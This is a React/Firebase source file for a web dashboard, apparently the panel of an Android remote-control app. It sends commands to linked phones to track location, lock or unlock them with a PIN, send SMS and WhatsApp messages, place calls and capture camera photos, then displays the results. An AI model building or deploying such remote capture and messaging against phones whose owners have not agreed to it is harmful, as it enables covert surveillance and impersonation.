import { useState, useEffect } from "react"
import { useNavigate } from "react-router-dom"
import { signOut, onAuthStateChanged } from "firebase/auth"
import { collection, onSnapshot, doc, setDoc, deleteDoc, addDoc, serverTimestamp, query, orderBy, limit } from "firebase/firestore"
import { auth, db } from "../firebase/config"

function Dashboard() {
  const navigate = useNavigate()
  const [user, setUser] = useState(null)
  const [devices, setDevices] = useState([])
  const [commandLogs, setCommandLogs] = useState([])
  const [loading, setLoading] = useState(true)
  const [selectedDevice, setSelectedDevice] = useState(null)
  const [showSmsModal, setShowSmsModal] = useState(false)
  const [smsNumber, setSmsNumber] = useState("")
  const [smsMessage, setSmsMessage] = useState("")
  const [showWhatsAppModal, setShowWhatsAppModal] = useState(false)
  const [waNumber, setWaNumber] = useState("")
  const [waMessage, setWaMessage] = useState("")
  const [showCallModal, setShowCallModal] = useState(false)
  const [callNumber, setCallNumber] = useState("")
  const [showUnlockModal, setShowUnlockModal] = useState(false)
  const [unlockPin, setUnlockPin] = useState("")
  const [lastCommandTime, setLastCommandTime] = useState({})
  const [now, setNow] = useState(Date.now())
  const [devicePhotos, setDevicePhotos] = useState([])
  // NEW: Track loading state for each button
  const [loadingButtons, setLoadingButtons] = useState({})

  // Update "now" every 10 seconds
  useEffect(() => {
    const interval = setInterval(() => {
      setNow(Date.now())
    }, 10000)
    return () => clearInterval(interval)
  }, [])

  // Auth listener
  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (currentUser) => {
      setUser(currentUser)
      setLoading(false)
      if (!currentUser) navigate("/login")
    })
    return () => unsubscribe()
  }, [navigate])

  // Real-time devices listener
  useEffect(() => {
    if (!user) return

    const devicesRef = collection(db, "users", user.uid, "devices")
    const unsubscribe = onSnapshot(devicesRef, (snapshot) => {
      const devicesData = snapshot.docs.map((doc) => ({
        id: doc.id,
        ...doc.data(),
      }))
      setDevices(devicesData)

      setSelectedDevice((prev) => {
        if (!prev) return devicesData.length > 0 ? devicesData[0] : null
        const updated = devicesData.find(d => d.id === prev.id)
        return updated || (devicesData.length > 0 ? devicesData[0] : null)
      })
    })

    return () => unsubscribe()
  }, [user])

  // Real-time command logs listener
  useEffect(() => {
    if (!user) return

    const logsRef = collection(db, "users", user.uid, "logs")
    const logsQuery = query(logsRef, orderBy("createdAt", "desc"), limit(20))

    const unsubscribe = onSnapshot(logsQuery, (snapshot) => {
      const logsData = snapshot.docs.map((doc) => ({
        id: doc.id,
        ...doc.data(),
      }))
      setCommandLogs(logsData)
    })

    return () => unsubscribe()
  }, [user])

  // Real-time photo listener for selected device
  useEffect(() => {
    if (!user || !selectedDevice?.id) {
      setDevicePhotos([])
      return
    }

    const photosRef = collection(
      db,
      "users",
      user.uid,
      "devices",
      selectedDevice.id,
      "photos"
    )

    const photosQuery = query(photosRef, orderBy("timestamp", "desc"), limit(50))

    const unsubscribe = onSnapshot(photosQuery, (snapshot) => {
      const photosData = snapshot.docs.map((doc) => ({
        id: doc.id,
        ...doc.data(),
      }))
      setDevicePhotos(photosData)
    })

    return () => unsubscribe()
  }, [user, selectedDevice])

  // Helper: check if device is truly online
  const isDeviceOnline = (device) => {
    if (device.status === "offline") return false
    if (device.status === "online") {
      if (!device.lastSeen) return false
      const lastSeenMs = device.lastSeen.seconds ? device.lastSeen.seconds * 1000 : device.lastSeen
      return (now - lastSeenMs) < 30000
    }
    return false
  }

  // Helper: format time ago
  const timeAgo = (timestamp) => {
    if (!timestamp) return "Never"
    const ts = timestamp.seconds ? timestamp.seconds * 1000 : timestamp
    const seconds = Math.floor((now - ts) / 1000)
    if (seconds < 10) return "Just now"
    if (seconds < 60) return `${seconds}s ago`
    if (seconds < 3600) return `${Math.floor(seconds / 60)}m ago`
    if (seconds < 86400) return `${Math.floor(seconds / 3600)}h ago`
    return `${Math.floor(seconds / 86400)}d ago`
  }

  // Send command with loading animation
  const sendCommand = async (deviceId, type, payload = {}) => {
    if (!user || !deviceId) return

    const key = `${deviceId}_${type}`
    const cmdNow = Date.now()
    if (lastCommandTime[key] && cmdNow - lastCommandTime[key] < 2000) {
      return
    }
    setLastCommandTime(prev => ({ ...prev, [key]: cmdNow }))

    // START loading animation
    setLoadingButtons(prev => ({ ...prev, [type]: true }))

    try {
      await addDoc(
        collection(db, "users", user.uid, "devices", deviceId, "commands"),
        {
          type: type,
          payload: payload,
          status: "pending",
          createdAt: serverTimestamp(),
        }
      )

      await addDoc(collection(db, "users", user.uid, "logs"), {
        deviceId: deviceId,
        deviceName: selectedDevice?.name || "Unknown",
        type: type,
        payload: payload,
        status: "sent",
        createdAt: serverTimestamp(),
      })
    } catch (error) {
      console.error("Error sending command:", error)
      alert("Failed to send command")
    }

    // STOP loading animation after 3 seconds
    setTimeout(() => {
      setLoadingButtons(prev => ({ ...prev, [type]: false }))
    }, 3000)
  }

  // NEW: Delete a photo
  const deletePhoto = async (photoId) => {
    if (!user || !selectedDevice?.id) return

    const confirmDelete = window.confirm("Delete this photo?")
    if (!confirmDelete) return

    try {
      await deleteDoc(
        doc(
          db,
          "users",
          user.uid,
          "devices",
          selectedDevice.id,
          "photos",
          photoId
        )
      )
    } catch (error) {
      console.error("Error deleting photo:", error)
      alert("Failed to delete photo")
    }
  }

  // NEW: Delete ALL photos
  const deleteAllPhotos = async () => {
    if (!user || !selectedDevice?.id || devicePhotos.length === 0) return

    const confirmDelete = window.confirm(`Delete all ${devicePhotos.length} photos?`)
    if (!confirmDelete) return

    try {
      for (const photo of devicePhotos) {
        await deleteDoc(
          doc(
            db,
            "users",
            user.uid,
            "devices",
            selectedDevice.id,
            "photos",
            photo.id
          )
        )
      }
    } catch (error) {
      console.error("Error deleting all photos:", error)
      alert("Failed to delete some photos")
    }
  }

  // Remove device
  const removeDevice = async (deviceId) => {
    if (!user) return

    const confirmRemove = window.confirm("Remove this device?")
    if (!confirmRemove) return

    try {
      await deleteDoc(doc(db, "users", user.uid, "devices", deviceId))
    } catch (error) {
      console.error("Error removing device:", error)
    }
  }

  // Handle SMS send
  const handleSendSms = () => {
    if (!smsNumber || !smsMessage) {
      alert("Enter phone number and message")
      return
    }
    sendCommand(selectedDevice.id, "SEND_SMS", {
      number: smsNumber,
      message: smsMessage,
    })
    setSmsNumber("")
    setSmsMessage("")
    setShowSmsModal(false)
  }

  // Handle WhatsApp send
  const handleSendWhatsApp = () => {
    if (!waNumber || !waMessage) {
      alert("Enter phone number and message")
      return
    }
    sendCommand(selectedDevice.id, "SEND_WHATSAPP", {
      number: waNumber,
      message: waMessage,
    })
    setWaNumber("")
    setWaMessage("")
    setShowWhatsAppModal(false)
  }

  // Handle Call
  const handleMakeCall = () => {
    if (!callNumber) {
      alert("Enter phone number")
      return
    }
    sendCommand(selectedDevice.id, "MAKE_CALL", {
      number: callNumber,
    })
    setCallNumber("")
    setShowCallModal(false)
  }

  const handleUnlockDevice = () => {
    if (!unlockPin) {
      alert("Enter PIN")
      return
    }
    sendCommand(selectedDevice.id, "UNLOCK_DEVICE", {
      pin: unlockPin,
    })
    setUnlockPin("")
    setShowUnlockModal(false)
  }

  // Logout
  const handleLogout = async () => {
    try {
      await signOut(auth)
      navigate("/")
    } catch (error) {
      console.error("Logout error:", error)
    }
  }

  if (loading) {
    return (
      <div
        style={{
          minHeight: "100vh",
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          background: "#0a0a0a",
          color: "white",
          fontFamily: "General Sans, sans-serif",
        }}
      >
        <div style={{ textAlign: "center" }}>
          <div style={{ width: "40px", height: "40px", border: "3px solid rgba(255,255,255,0.1)", borderTopColor: "#fff", borderRadius: "50%", animation: "spin 1s linear infinite", margin: "0 auto 16px" }} />
          <p style={{ color: "rgba(255,255,255,0.5)" }}>Loading dashboard...</p>
        </div>
      </div>
    )
  }

  return (
    <div
      style={{
        minHeight: "100vh",
        width: "100%",
        position: "relative",
        overflow: "hidden",
        fontFamily: "General Sans, sans-serif",
        color: "#ffffff",
      }}
    >
      {/* Background Video */}
      <video
        style={{
          position: "fixed",
          top: 0,
          left: 0,
          width: "100%",
          height: "100%",
          objectFit: "cover",
          zIndex: 0,
        }}
        src="https://d8j0ntlcm91z4.cloudfront.net/user_38xzZboKViGWJOttwIXH07lWA1P/hf_20260217_030345_246c0224-10a4-422c-b324-070b7c0eceda.mp4"
        autoPlay
        loop
        muted
        playsInline
      />

      {/* Overlay */}
      <div
        style={{
          position: "fixed",
          top: 0,
          left: 0,
          width: "100%",
          height: "100%",
          background: "rgba(0, 0, 0, 0.75)",
          zIndex: 1,
        }}
      />

      {/* Styles */}
      <style>{`
        .dash-nav { padding: 16px 24px; }
        .dash-main { padding: 32px 24px 60px; }
        .dash-stats { grid-template-columns: repeat(3, 1fr); gap: 14px; }
        .dash-controls { grid-template-columns: repeat(4, 1fr); gap: 10px; }
        .dash-home-btn { display: flex; }
        .device-info-grid-container { grid-template-columns: repeat(4, 1fr); }
        @media (max-width: 768px) {
          .dash-nav { padding: 14px 16px; }
          .dash-main { padding: 20px 16px 40px; }
          .dash-stats { grid-template-columns: 1fr; gap: 10px; }
          .dash-controls { grid-template-columns: repeat(2, 1fr); gap: 8px; }
          .dash-home-btn { display: none; }
          .device-info-grid-container { grid-template-columns: repeat(2, 1fr) !important; }
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes btnLoading {
          0% { background-position: 200% center; }
          100% { background-position: -200% center; }
        }
        @keyframes ripple {
          0% { transform: scale(0); opacity: 0.5; }
          100% { transform: scale(4); opacity: 0; }
        }
        @keyframes checkmark {
          0% { transform: scale(0) rotate(45deg); opacity: 0; }
          50% { transform: scale(1.2) rotate(45deg); opacity: 1; }
          100% { transform: scale(1) rotate(45deg); opacity: 1; }
        }
        @keyframes slideDown {
          from { opacity: 0; transform: translateY(-10px); }
          to { opacity: 1; transform: translateY(0); }
        }
        @keyframes photoIn {
          from { opacity: 0; transform: scale(0.9); }
          to { opacity: 1; transform: scale(1); }
        }
        .ctrl-btn {
          position: relative;
          overflow: hidden;
          transition: all 0.25s ease;
        }
        .ctrl-btn:active {
          transform: scale(0.95) !important;
        }
        .ctrl-btn-loading {
          pointer-events: none;
        }
        .photo-card:hover .photo-overlay {
          opacity: 1;
        }
      `}</style>

      {/* Content */}
      <div style={{ position: "relative", zIndex: 2, minHeight: "100vh" }}>
        {/* Navbar */}
        <header
          style={{
            width: "100%",
            borderBottom: "1px solid rgba(255,255,255,0.06)",
            background: "rgba(0,0,0,0.3)",
            backdropFilter: "blur(20px)",
            WebkitBackdropFilter: "blur(20px)",
            position: "sticky",
            top: 0,
            zIndex: 20,
          }}
        >
          <div
            className="dash-nav"
            style={{
              maxWidth: "1200px",
              margin: "0 auto",
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              boxSizing: "border-box",
            }}
          >
            <div style={{ display: "flex", alignItems: "center", gap: "14px" }}>
              <div
                onClick={() => navigate("/")}
                style={{
                  width: "40px",
                  height: "40px",
                  borderRadius: "10px",
                  background: "rgba(255,255,255,0.06)",
                  border: "1px solid rgba(255,255,255,0.1)",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  cursor: "pointer",
                  transition: "all 0.2s ease",
                  flexShrink: 0,
                }}
                onMouseEnter={(e) => (e.currentTarget.style.background = "rgba(255,255,255,0.1)")}
                onMouseLeave={(e) => (e.currentTarget.style.background = "rgba(255,255,255,0.06)")}
              >
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <rect x="5" y="2" width="14" height="20" rx="2" ry="2" />
                  <line x1="12" y1="18" x2="12" y2="18" />
                </svg>
              </div>
              <div>
                <h1 style={{ margin: 0, fontSize: "16px", fontWeight: 600 }}>Dashboard</h1>
                <div style={{ display: "flex", alignItems: "center", gap: "6px", marginTop: "2px" }}>
                  <span style={{ width: "6px", height: "6px", borderRadius: "50%", background: "#10b981", boxShadow: "0 0 8px #10b981", flexShrink: 0 }} />
                  <p style={{ margin: 0, fontSize: "12px", color: "rgba(255,255,255,0.45)", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", maxWidth: "180px" }}>
                    {user?.email || "Connected"}
                  </p>
                </div>
              </div>
            </div>

            <div style={{ display: "flex", gap: "10px", flexShrink: 0 }}>
              <button
                onClick={() => navigate("/")}
                className="dash-home-btn"
                style={{
                  height: "36px", padding: "0 14px", borderRadius: "8px",
                  border: "1px solid rgba(255,255,255,0.1)", background: "rgba(255,255,255,0.04)",
                  color: "rgba(255,255,255,0.7)", fontSize: "13px", fontWeight: 500,
                  cursor: "pointer", fontFamily: "General Sans, sans-serif",
                  transition: "all 0.2s ease", alignItems: "center",
                }}
                onMouseEnter={(e) => { e.currentTarget.style.background = "rgba(255,255,255,0.08)"; e.currentTarget.style.borderColor = "rgba(255,255,255,0.2)" }}
                onMouseLeave={(e) => { e.currentTarget.style.background = "rgba(255,255,255,0.04)"; e.currentTarget.style.borderColor = "rgba(255,255,255,0.1)" }}
              >
                Home
              </button>
              <button
                onClick={handleLogout}
                style={{
                  height: "36px", padding: "0 14px", borderRadius: "8px",
                  border: "1px solid rgba(239,68,68,0.2)", background: "rgba(239,68,68,0.06)",
                  color: "#ef4444", fontSize: "13px", fontWeight: 500,
                  cursor: "pointer", fontFamily: "General Sans, sans-serif",
                  transition: "all 0.2s ease", display: "flex", alignItems: "center",
                }}
                onMouseEnter={(e) => { e.currentTarget.style.background = "rgba(239,68,68,0.15)"; e.currentTarget.style.borderColor = "rgba(239,68,68,0.4)" }}
                onMouseLeave={(e) => { e.currentTarget.style.background = "rgba(239,68,68,0.06)"; e.currentTarget.style.borderColor = "rgba(239,68,68,0.2)" }}
              >
                Sign out
              </button>
            </div>
          </div>
        </header>

        {/* Main */}
        <main className="dash-main" style={{ maxWidth: "1200px", margin: "0 auto", boxSizing: "border-box" }}>
          {/* Stats */}
          <div className="dash-stats" style={{ display: "grid", marginBottom: "32px" }}>
            {[
              { label: "📱 Connected Devices", value: devices.length },
              { label: "🟢 Online Now", value: devices.filter((d) => isDeviceOnline(d)).length },
              { label: "⚡ Commands Sent", value: commandLogs.length },
            ].map((item, i) => (
              <div
                key={i}
                style={{
                  padding: "22px", borderRadius: "14px",
                  background: "rgba(255,255,255,0.03)",
                  border: "1px solid rgba(255,255,255,0.06)",
                  backdropFilter: "blur(12px)",
                  animation: `fadeIn 0.3s ease ${i * 0.1}s both`,
                }}
              >
                <div style={{ display: "flex", alignItems: "center", gap: "10px", marginBottom: "14px" }}>
                  <p style={{ margin: 0, fontSize: "13px", fontWeight: 500, color: "rgba(255,255,255,0.45)" }}>{item.label}</p>
                </div>
                <h2 style={{ margin: 0, fontSize: "28px", fontWeight: 600, letterSpacing: "-0.5px" }}>{item.value}</h2>
              </div>
            ))}
          </div>

          {/* Devices Section Header */}
          <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", gap: "16px", marginBottom: "18px", flexWrap: "wrap" }}>
            <div>
              <h2 style={{ margin: "0 0 4px 0", fontSize: "18px", fontWeight: 600 }}>Your Devices</h2>
              <p style={{ margin: 0, fontSize: "13px", color: "rgba(255,255,255,0.4)" }}>
                {devices.length > 0 ? "Select a device to control it" : "Install the Android app on your phone to connect"}
              </p>
            </div>
          </div>

          {/* Empty State */}
          {devices.length === 0 && (
            <div
              style={{
                borderRadius: "16px", border: "1px dashed rgba(255,255,255,0.08)",
                background: "rgba(255,255,255,0.02)", backdropFilter: "blur(10px)",
                padding: "60px 24px", textAlign: "center",
                display: "flex", flexDirection: "column", alignItems: "center", marginBottom: "32px",
              }}
            >
              <div style={{ width: "56px", height: "56px", marginBottom: "20px", borderRadius: "14px", background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.08)", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "24px" }}>
                📱
              </div>
              <h3 style={{ margin: "0 0 8px 0", fontSize: "17px", fontWeight: 600 }}>No devices connected</h3>
              <p style={{ margin: 0, fontSize: "14px", color: "rgba(255,255,255,0.4)", maxWidth: "360px", lineHeight: 1.6 }}>
                Install the Android app on your phone and sign in with the same account to connect your device.
              </p>
            </div>
          )}

          {/* Device Cards */}
          {devices.length > 0 && (
            <div style={{ display: "flex", flexDirection: "column", gap: "16px", marginBottom: "32px" }}>
              {devices.map((device) => {
                const online = isDeviceOnline(device)
                return (
                  <div
                    key={device.id}
                    style={{
                      borderRadius: "16px",
                      background: selectedDevice?.id === device.id ? "rgba(255,255,255,0.05)" : "rgba(255,255,255,0.02)",
                      border: selectedDevice?.id === device.id ? "1px solid rgba(255,255,255,0.15)" : "1px solid rgba(255,255,255,0.06)",
                      backdropFilter: "blur(12px)", padding: "24px",
                      cursor: "pointer", transition: "all 0.2s ease",
                      boxSizing: "border-box", animation: "fadeIn 0.3s ease both",
                    }}
                    onClick={() => setSelectedDevice(device)}
                  >
                    {/* Device Header */}
                    <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "20px" }}>
                      <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
                        <div
                          style={{
                            width: "42px", height: "42px", borderRadius: "10px",
                            background: online ? "rgba(16,185,129,0.1)" : "rgba(255,255,255,0.06)",
                            border: online ? "1px solid rgba(16,185,129,0.2)" : "1px solid rgba(255,255,255,0.1)",
                            display: "flex", alignItems: "center", justifyContent: "center",
                            flexShrink: 0, fontSize: "20px",
                          }}
                        >
                          📱
                        </div>
                        <div>
                          <h3 style={{ margin: 0, fontSize: "15px", fontWeight: 600 }}>{device.name}</h3>
                          <p style={{ margin: "2px 0 0 0", fontSize: "12px", color: "rgba(255,255,255,0.45)" }}>
                            {device.model} · {device.osVersion}
                          </p>
                        </div>
                      </div>

                      <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
                        <div style={{ display: "flex", flexDirection: "column", alignItems: "flex-end", gap: "4px" }}>
                          <div style={{ display: "flex", alignItems: "center", gap: "6px", padding: "4px 10px", borderRadius: "6px", background: online ? "rgba(16,185,129,0.1)" : "rgba(239,68,68,0.1)" }}>
                            <span style={{ width: "6px", height: "6px", borderRadius: "50%", background: online ? "#10b981" : "#ef4444", boxShadow: online ? "0 0 6px #10b981" : "none", animation: online ? "pulse 2s infinite" : "none" }} />
                            <span style={{ fontSize: "11px", fontWeight: 500, color: online ? "#10b981" : "#ef4444" }}>
                              {online ? "Online" : "Offline"}
                            </span>
                          </div>
                          <span style={{ fontSize: "10px", color: "rgba(255,255,255,0.3)" }}>{timeAgo(device.lastSeen)}</span>
                        </div>

                        <button
                          onClick={(e) => { e.stopPropagation(); removeDevice(device.id) }}
                          style={{
                            width: "32px", height: "32px", borderRadius: "8px",
                            border: "1px solid rgba(239,68,68,0.2)", background: "rgba(239,68,68,0.06)",
                            color: "#ef4444", display: "flex", alignItems: "center",
                            justifyContent: "center", cursor: "pointer", transition: "all 0.2s ease",
                          }}
                          onMouseEnter={(e) => { e.currentTarget.style.background = "rgba(239,68,68,0.15)" }}
                          onMouseLeave={(e) => { e.currentTarget.style.background = "rgba(239,68,68,0.06)" }}
                        >
                          ✕
                        </button>
                      </div>
                    </div>

                    {/* Device Info Grid */}
                    <div className="device-info-grid-container" style={{ display: "grid", gap: "12px", marginBottom: "20px" }}>
                      {[
                        { label: "🔋 Battery", value: `${device.battery || 0}%`, extra: device.charging ? "⚡ Charging" : "Not charging", color: (device.battery || 0) > 20 ? "#10b981" : "#ef4444" },
                        { label: "📶 Network", value: device.network || "N/A", extra: "", color: "#60a5fa" },
                        { label: "📱 Brand", value: device.brand || "N/A", extra: device.model || "", color: "#a78bfa" },
                        { label: "⏱️ Last Seen", value: timeAgo(device.lastSeen), extra: online ? "Active now" : "Disconnected", color: online ? "#10b981" : "#ef4444" },
                      ].map((info, i) => (
                        <div key={i} style={{ padding: "14px", borderRadius: "10px", background: "rgba(255,255,255,0.03)", border: "1px solid rgba(255,255,255,0.06)" }}>
                          <p style={{ margin: "0 0 6px 0", fontSize: "11px", color: "rgba(255,255,255,0.4)" }}>{info.label}</p>
                          <p style={{ margin: 0, fontSize: "15px", fontWeight: 600, color: info.color }}>{info.value}</p>
                          {info.extra && <p style={{ margin: "2px 0 0 0", fontSize: "11px", color: "rgba(255,255,255,0.3)" }}>{info.extra}</p>}
                        </div>
                      ))}
                    </div>

                    {/* Location Box */}
                    {device.lastLocation && selectedDevice?.id === device.id && (
                      <div style={{ marginBottom: "20px", padding: "16px", borderRadius: "12px", background: "rgba(59, 130, 246, 0.08)", border: "1px solid rgba(59, 130, 246, 0.2)", animation: "fadeIn 0.3s ease" }}>
                        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "10px" }}>
                          <p style={{ margin: 0, fontSize: "14px", fontWeight: 600, color: "#60a5fa" }}>📍 Latest Location</p>
                          <span style={{ fontSize: "10px", color: "rgba(255,255,255,0.4)" }}>
                            {device.lastLocation.timestamp ? new Date(device.lastLocation.timestamp).toLocaleString() : ""}
                          </span>
                        </div>
                        <p style={{ margin: "0 0 4px 0", fontSize: "12px", color: "rgba(255,255,255,0.6)" }}>
                          Lat: {device.lastLocation.latitude?.toFixed(6)} · Lng: {device.lastLocation.longitude?.toFixed(6)}
                        </p>
                        <p style={{ margin: "0 0 12px 0", fontSize: "12px", color: "rgba(255,255,255,0.4)" }}>
                          Accuracy: {Math.round(device.lastLocation.accuracy || 0)} meters
                        </p>
                        <div style={{ display: "flex", gap: "8px", flexWrap: "wrap" }}>
                          <a
                            href={`https://www.google.com/maps?q=${device.lastLocation.latitude},${device.lastLocation.longitude}`}
                            target="_blank" rel="noreferrer"
                            style={{ display: "inline-flex", alignItems: "center", gap: "6px", background: "#3b82f6", color: "white", padding: "8px 16px", borderRadius: "8px", fontSize: "12px", fontWeight: 600, textDecoration: "none", fontFamily: "General Sans, sans-serif" }}
                          >
                            🗺️ Open in Google Maps
                          </a>
                          <button
                            onClick={(e) => { e.stopPropagation(); sendCommand(device.id, "GET_LOCATION") }}
                            style={{ display: "inline-flex", alignItems: "center", gap: "6px", background: "rgba(59,130,246,0.2)", color: "#60a5fa", padding: "8px 16px", borderRadius: "8px", fontSize: "12px", fontWeight: 600, border: "1px solid rgba(59,130,246,0.3)", cursor: "pointer", fontFamily: "General Sans, sans-serif" }}
                          >
                            🔄 Refresh Location
                          </button>
                        </div>
                      </div>
                    )}

                    {/* ===== PHOTO GALLERY (UPDATED WITH DELETE) ===== */}
                    {selectedDevice?.id === device.id && devicePhotos.length > 0 && (
                      <div
                        style={{
                          marginBottom: "20px", padding: "16px", borderRadius: "12px",
                          background: "rgba(236,72,153,0.08)",
                          border: "1px solid rgba(236,72,153,0.2)",
                          animation: "slideDown 0.4s ease",
                        }}
                      >
                        {/* Photo Header with Delete All */}
                        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "12px" }}>
                          <p style={{ margin: 0, fontSize: "14px", fontWeight: 600, color: "#f472b6" }}>
                            📸 Captured Photos
                          </p>
                          <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
                            <span style={{ fontSize: "11px", color: "rgba(255,255,255,0.45)" }}>
                              {devicePhotos.length} photo(s)
                            </span>
                            <button
                              onClick={(e) => { e.stopPropagation(); deleteAllPhotos() }}
                              style={{
                                padding: "4px 10px", borderRadius: "6px", fontSize: "11px",
                                fontWeight: 600, border: "1px solid rgba(239,68,68,0.3)",
                                background: "rgba(239,68,68,0.1)", color: "#ef4444",
                                cursor: "pointer", fontFamily: "General Sans, sans-serif",
                                transition: "all 0.2s ease",
                              }}
                              onMouseEnter={(e) => { e.currentTarget.style.background = "rgba(239,68,68,0.2)" }}
                              onMouseLeave={(e) => { e.currentTarget.style.background = "rgba(239,68,68,0.1)" }}
                            >
                              🗑️ Delete All
                            </button>
                          </div>
                        </div>

                        {/* Photo Grid */}
                        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(180px, 1fr))", gap: "12px" }}>
                          {devicePhotos.map((photo, idx) => (
                            <div
                              key={photo.id}
                              className="photo-card"
                              style={{
                                background: "rgba(255,255,255,0.03)",
                                border: "1px solid rgba(255,255,255,0.08)",
                                borderRadius: "10px", padding: "10px",
                                position: "relative",
                                animation: `photoIn 0.3s ease ${idx * 0.05}s both`,
                              }}
                            >
                              {/* Photo Image with hover overlay */}
                              <div style={{ position: "relative", borderRadius: "8px", overflow: "hidden", marginBottom: "8px" }}>
                                <img
                                  src={`data:image/jpeg;base64,${photo.imageBase64}`}
                                  alt={photo.label}
                                  style={{
                                    width: "100%", height: "160px",
                                    objectFit: "cover", display: "block",
                                  }}
                                />
                                {/* Hover overlay with view */}
                                <div
                                  className="photo-overlay"
                                  style={{
                                    position: "absolute", top: 0, left: 0,
                                    width: "100%", height: "100%",
                                    background: "rgba(0,0,0,0.5)",
                                    display: "flex", alignItems: "center",
                                    justifyContent: "center", opacity: 0,
                                    transition: "opacity 0.2s ease",
                                  }}
                                >
                                  <span style={{ fontSize: "28px" }}>🔍</span>
                                </div>
                              </div>

                              {/* Photo Info */}
                              <p style={{ margin: "0 0 4px 0", fontSize: "12px", fontWeight: 600, color: "#ffffff", textTransform: "capitalize" }}>
                                {photo.label} camera
                              </p>
                              <p style={{ margin: "0 0 8px 0", fontSize: "11px", color: "rgba(255,255,255,0.45)" }}>
                                {photo.timestamp ? new Date(photo.timestamp).toLocaleString() : "Just now"}
                              </p>

                              {/* Download + Delete buttons */}
                              <div style={{ display: "flex", gap: "6px" }}>
                                <a
                                  href={`data:image/jpeg;base64,${photo.imageBase64}`}
                                  download={`${photo.label}-${photo.timestamp || Date.now()}.jpg`}
                                  style={{
                                    flex: 1, textAlign: "center", padding: "7px 8px",
                                    borderRadius: "7px", background: "rgba(236,72,153,0.18)",
                                    border: "1px solid rgba(236,72,153,0.28)",
                                    color: "#f9a8d4", textDecoration: "none",
                                    fontSize: "11px", fontWeight: 600,
                                    boxSizing: "border-box", transition: "all 0.2s ease",
                                  }}
                                >
                                  ⬇ Download
                                </a>
                                <button
                                  onClick={(e) => { e.stopPropagation(); deletePhoto(photo.id) }}
                                  style={{
                                    width: "36px", height: "auto",
                                    borderRadius: "7px", border: "1px solid rgba(239,68,68,0.3)",
                                    background: "rgba(239,68,68,0.12)",
                                    color: "#ef4444", fontSize: "13px",
                                    cursor: "pointer", display: "flex",
                                    alignItems: "center", justifyContent: "center",
                                    transition: "all 0.2s ease", flexShrink: 0,
                                  }}
                                  onMouseEnter={(e) => { e.currentTarget.style.background = "rgba(239,68,68,0.25)" }}
                                  onMouseLeave={(e) => { e.currentTarget.style.background = "rgba(239,68,68,0.12)" }}
                                >
                                  🗑️
                                </button>
                              </div>
                            </div>
                          ))}
                        </div>
                      </div>
                    )}

                    {/* ===== CONTROL BUTTONS WITH LOADING ===== */}
                    <div className="dash-controls" style={{ display: "grid" }}>
                      {[
                        { label: "📍 Get Location", cmd: "GET_LOCATION", bg: "rgba(59,130,246,0.1)", bd: "rgba(59,130,246,0.2)", loadColor: "#3b82f6" },
                        { label: "🔔 Ring", cmd: "RING_DEVICE", bg: "rgba(245,158,11,0.1)", bd: "rgba(245,158,11,0.2)", loadColor: "#f59e0b" },
                        { label: "🔕 Stop Ring", cmd: "STOP_RING", bg: "rgba(107,114,128,0.1)", bd: "rgba(107,114,128,0.2)", loadColor: "#6b7280" },
                        { label: "🔦 Flash", cmd: "TOGGLE_FLASH", bg: "rgba(234,179,8,0.1)", bd: "rgba(234,179,8,0.2)", loadColor: "#eab308" },
                        { label: "🔒 Lock", cmd: "LOCK_DEVICE", bg: "rgba(239,68,68,0.1)", bd: "rgba(239,68,68,0.2)", loadColor: "#ef4444" },
                        { label: "🔓 Unlock", cmd: "UNLOCK_MODAL", bg: "rgba(34,197,94,0.1)", bd: "rgba(34,197,94,0.2)", loadColor: "#22c55e" },
                        { label: "💬 SMS", cmd: "SMS_MODAL", bg: "rgba(16,185,129,0.1)", bd: "rgba(16,185,129,0.2)", loadColor: "#10b981" },
                        { label: "📱 WhatsApp", cmd: "WHATSAPP_MODAL", bg: "rgba(37,211,102,0.1)", bd: "rgba(37,211,102,0.2)", loadColor: "#25d366" },
                        { label: "📞 Call", cmd: "CALL_MODAL", bg: "rgba(139,92,246,0.1)", bd: "rgba(139,92,246,0.2)", loadColor: "#8b5cf6" },
                        { label: "📸 Photo", cmd: "CAPTURE_PHOTO", bg: "rgba(236,72,153,0.1)", bd: "rgba(236,72,153,0.2)", loadColor: "#ec4899" },
                      ].map((btn, i) => {
                        const isLoading = loadingButtons[btn.cmd] || false
                        const isModal = ["SMS_MODAL", "WHATSAPP_MODAL", "CALL_MODAL", "UNLOCK_MODAL"].includes(btn.cmd)

                        return (
                          <button
                            key={i}
                            className={`ctrl-btn ${isLoading ? "ctrl-btn-loading" : ""}`}
                            onClick={(e) => {
                              e.stopPropagation()
                              if (btn.cmd === "SMS_MODAL") setShowSmsModal(true)
                              else if (btn.cmd === "WHATSAPP_MODAL") setShowWhatsAppModal(true)
                              else if (btn.cmd === "CALL_MODAL") setShowCallModal(true)
                              else if (btn.cmd === "UNLOCK_MODAL") setShowUnlockModal(true)
                              else sendCommand(device.id, btn.cmd)
                            }}
                            style={{
                              height: "48px", borderRadius: "10px",
                              border: `1px solid ${isLoading ? btn.loadColor : btn.bd}`,
                              background: isLoading
                                ? `linear-gradient(90deg, ${btn.bg}, rgba(255,255,255,0.08), ${btn.bg})`
                                : btn.bg,
                              backgroundSize: isLoading ? "200% 100%" : "100% 100%",
                              animation: isLoading ? "btnLoading 1.5s ease infinite" : "none",
                              color: isLoading ? btn.loadColor : "rgba(255,255,255,0.85)",
